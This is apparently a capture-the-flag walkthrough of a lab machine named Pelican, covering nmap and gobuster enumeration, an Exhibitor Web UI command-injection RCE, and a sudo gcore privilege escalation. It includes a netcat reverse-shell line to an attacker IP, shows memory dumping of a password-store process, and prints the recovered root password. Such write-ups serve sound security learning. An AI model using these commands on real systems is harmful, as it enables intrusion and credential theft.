IP - 192.168.162.98

---

# Nmap Scan

```jsx
nmap -sCV 192.168.162.98 

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 a8:e1:60:68:be:f5:8e:70:70:54:b4:27:ee:9a:7e:7f (RSA)
|   256 bb:99:9a:45:3f:35:0b:b3:49:e6:cf:11:49:87:8d:94 (ECDSA)
|_  256 f2:eb:fc:45:d7:e9:80:77:66:a3:93:53:de:00:57:9c (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
631/tcp  open  ipp         CUPS 2.2
|_http-title: Forbidden - CUPS v2.2.10
|_http-server-header: CUPS/2.2 IPP/2.1
| http-methods: 
|_  Potentially risky methods: PUT
2222/tcp open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 a8:e1:60:68:be:f5:8e:70:70:54:b4:27:ee:9a:7e:7f (RSA)
|   256 bb:99:9a:45:3f:35:0b:b3:49:e6:cf:11:49:87:8d:94 (ECDSA)
|_  256 f2:eb:fc:45:d7:e9:80:77:66:a3:93:53:de:00:57:9c (ED25519)
8080/tcp open  http        Jetty 1.0
|_http-server-header: Jetty(1.0)
|_http-title: Error 404 Not Found
8081/tcp open  http        nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Did not follow redirect to http://192.168.162.98:8080/exhibitor/v1/ui/index.html
Service Info: Host: PELICAN; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h20m00s, deviation: 2h18m35s, median: 0s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2026-06-10T09:14:21
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: pelican
|   NetBIOS computer name: PELICAN\x00
|   Domain name: \x00
|   FQDN: pelican
|_  System time: 2026-06-10T05:14:21-04:00

```

# Nmap Scan 2

```jsx
nmap 192.168.162.98  -sS -sV -p-  
     
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-10 05:52 -0400
Nmap scan report for 192.168.162.98
Host is up (0.076s latency).
Not shown: 65526 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
631/tcp   open  ipp         CUPS 2.2
2181/tcp  open  zookeeper   Zookeeper 3.4.6-1569965 (Built on 02/20/2014)
2222/tcp  open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
8080/tcp  open  http        Jetty 1.0
8081/tcp  open  http        nginx 1.14.2
43499/tcp open  java-rmi    Java RMI
Service Info: Host: PELICAN; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

as we can see there are many ports open . it is a linux machine 

- There are 2 port for login . 22 and 2222
- 139 netbios and 445 samba (SMB) is open.
- Two Web servers are open 8080 and 8081 one is jetty and one is zookeeper
- and there is one cup server 631

---

# Bruteforcing directory.

## Gobsuter 8080

```jsx
gobuster dir -u  http://192.168.162.98:8080/   -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt 
```

We find nothing interesting here but , when we go the firefox to see the applicaion , we can find zookeeper , adn application for distributed application 

!image.png

Here we canb see that the hostname is “Pelican” , which could be a username , butr lets get back here after checking others.

## SO the local flag was very easy ,

We didnt scan perrfectly , and after searchin theough we find exat and the zookeper vesrion also.

when we search for exploit we get the RCE . 

Exhibitor Web UI 1.7.1 - Remote Code Execution

Here we only has to follow the procedures and BOOM we get the shell.

### These are the main steps to be percise

```jsx
he steps to exploit it from a web browser:

    Open the Exhibitor Web UI and click on the Config tab, then flip the Editing switch to ON

    In the “java.env script” field, enter any command surrounded by $() or ``, for example, for a simple reverse shell:

    $(/bin/nc -e /bin/sh 10.0.0.64 4444 &)
    Click Commit > All At Once > OK
    The command may take up to a minute to execute.
```

---

# Privesc

# SUDO Exploitation

when we check thhe sudo exploitation we found this.

```jsx
sudo -l  
sudo -l 
Matching Defaults entries for charles on pelican:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User charles may run the following commands on pelican:
    (ALL) NOPASSWD: /usr/bin/gcore

```

The user can run , gcore with sudo 

when we check that on GTFOI bin we find out we need the PID  

https://gtfobins.org/gtfobins/gcore/#file-read

The  we try find any file , regarding password and all that should be check every time.

We find someting intersting we find here .

```jsx
ps -aux | grep "password"
^[[3~ps -aux | grep "password"
root       513  0.0  0.0   2276    72 ?        Ss   05:09   0:00 /usr/bin/password-store
charles  23553  0.0  0.0   6208   824 pts/1    S+   06:32   0:00 grep password

```

There is a passwored store file here 

and the PID is 513 , then we put the GTFO bins command there and get these ,

```jsx
 sudo /usr/bin/gcore 513
sudo /usr/bin/gcore 513
0x00007f971bd1c6f4 in __GI___nanosleep (requested_time=requested_time@entry=0x7ffc3d7a2c80, remaining=remaining@entry=0x7ffc3d7a2c80) at ../sysdeps/unix/sysv/linux/nanosleep.c:28
28      ../sysdeps/unix/sysv/linux/nanosleep.c: No such file or directory.
Saved corefile core.513

```

To read this we use the strings .

```jsx
strings core.513

and we find root password there 

001 Password: root:
ClogKingpinInning731
E?z=
 
 

```

The we su root and p[assword anbed boom we find thhe flag
